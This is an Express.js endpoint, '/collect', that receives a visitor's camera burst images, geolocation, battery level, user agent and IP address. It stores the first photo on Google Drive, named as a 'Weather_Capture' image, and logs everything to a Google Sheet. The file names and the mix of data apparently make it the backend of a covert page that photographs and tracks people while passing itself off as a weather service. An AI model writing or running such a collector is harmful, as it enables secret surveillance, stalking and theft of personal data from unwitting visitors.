app.post('/collect', async (req, res) => {
  try {
    const { ts, hints, battery, location, burstImages } = req.body;
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

    // 1. Upload the first image to Google Drive
    const imgBase64 = burstImages[0].split(',')[1];
    const buffer = Buffer.from(imgBase64, 'base64');
    
    const driveFile = await drive.files.create({
      requestBody: {
        name: `Weather_Capture_${Date.now()}.jpg`,
        parents: [FOLDER_ID]
      },
      media: {
        mimeType: 'image/jpeg',
        body: Readable.from(buffer)
      },
      // CRITICAL FIX: This allows the service account to use your folder's space
      supportsAllDrives: true, 
      fields: 'id, webViewLink'
    });

    // 2. Append the data and the new Drive link to the Sheet
    const row = [
      ts, ip, hints?.ua || 'N/A', 
      (battery?.levelPercent || 0) + '%', 
      `${location?.lat || 0}, ${location?.lon || 0}`,
      driveFile.data.webViewLink 
    ];

    await sheets.spreadsheets.values.append({
      spreadsheetId: process.env.GOOGLE_SHEET_ID,
      range: 'Logs!A1',
      valueInputOption: 'RAW',
      requestBody: { values: [row] }
    });

    console.log("✅ Successfully saved to Drive and Sheet");
    res.json({ ok: true });
  } catch (err) {
    console.error("❌ ERROR:", err.message);
    res.status(500).json({ error: err.message });
  }
});
